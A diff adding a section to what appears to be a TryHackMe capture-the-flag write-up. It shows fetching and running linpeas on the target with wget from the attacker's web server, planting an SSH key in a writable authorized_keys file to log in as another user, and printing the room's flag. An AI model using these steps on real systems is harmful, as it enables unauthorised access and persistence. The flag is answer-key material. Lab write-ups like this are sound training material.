@@ -263,6 +263,87 @@ stty raw -echo && fg
 As www-data, we cannot find the flag directly in its home directory. We first conveniently enumerate the target using Linpeas.
 
 
+open linpeas dir in your pc and write:
+
+```
+python3 -m http.server 5555
+```
+
+on server write:
+
+```
+cd /tmp
+```
+
+```
+wget http://10.8.47.102:5555/linpeas.sh
+```
+
+```
+chmod +x linpeas.sh
+```
+
+```
+./linpeas.sh
+```
+
+found that 
+
+![image](https://github.com/user-attachments/assets/576e7430-cd90-4f0d-afdf-d1bdddee6bf3)
+
+```
+/etc/systemd/system/exploit.timer
+```
+
+can help us later when want to get root 
+
+found also that we can write in this file 
+
+![image](https://github.com/user-attachments/assets/543010f0-cb4b-4242-b643-8e09ec9dfbbd)
+
+```
+/home/comte/.ssh/authorized_keys
+```
+
+this file is empty we will make ssh key and put it in it so we can use this ssh key to access machine as ``comte``
+
+```
+ssh-keygen -t rsa
+```
+
+![image](https://github.com/user-attachments/assets/c1c3839c-4c96-4cea-accf-1e9d59bd7f86)
+
+![image](https://github.com/user-attachments/assets/09414d4f-30ae-4a73-b24e-da50fd39dd46)
+
+put this in ``/authorized_keys``
+
+```
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMXJ7nSUUiquqfFUcZxwio/N4IW+7A3t8vD6+R5SUvUl1zQVKKcLkRxb30bWeVSYrwYWI0A5Wxs5P8vXLIaQCYcA9z5gmtuOpqHsIOOzYQ3i2DXe5a0uvfKXWQsa83bug3mEjoj26rvbM2xdn/I6pIws5cLXh2TS8cnhKjiiAnfx1tcAfo7q2hRv/CTV/fKH2/7YNzu24DVE15wk0g/XobMJH4QV0ZYQvM1pdUe6MU5pT0ewperIsXHkUW4Qu0SFv3SzvjMJ9GPEyWHBv5xdFpHwscrSrVIr4x4nTqgpSKOXOQVR/iV3klzD5roigxLJ8hKMKP2qAY5j0e94TjEtDx+yyqnK2SjW6oe7WqOStb3hrfVXn9O9IrOaG9npd+6+vqG2wO3LNUfW2kRK4ratXMXuo6nFJ8Y7VJestcJ+mXolKZV6yQgLUmjl/8JwhtRMzsXuRblQ7i3KkSRXBvjLuve4+FJhruBbIPNIKqgr9TurRBXgDOvC8ujidgsX0pQwM= kali@kali
+```
+
+![image](https://github.com/user-attachments/assets/b49e280d-30a2-470a-8500-d842f6139922)
+
+
+after that login with ssh :
+
+```
+ssh -i id_rsa comte@10.10.180.156
+```
+
+![image](https://github.com/user-attachments/assets/911da338-c50e-4c51-aaee-4cb527270d50)
+
+![image](https://github.com/user-attachments/assets/2fe5f87f-2f17-4e8b-ba9a-0fc458012ae6)
+
+first flag 😝
+
+```
+THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
+```
+
+![image](https://github.com/user-attachments/assets/0f3f335e-ec60-47b3-96b6-c22545fa7c85)
+
+
+oh so now will return to this ``/etc/systemd/system/exploit.timer`` and ``/etc/systemd/system/exploit.service``
 
 
 
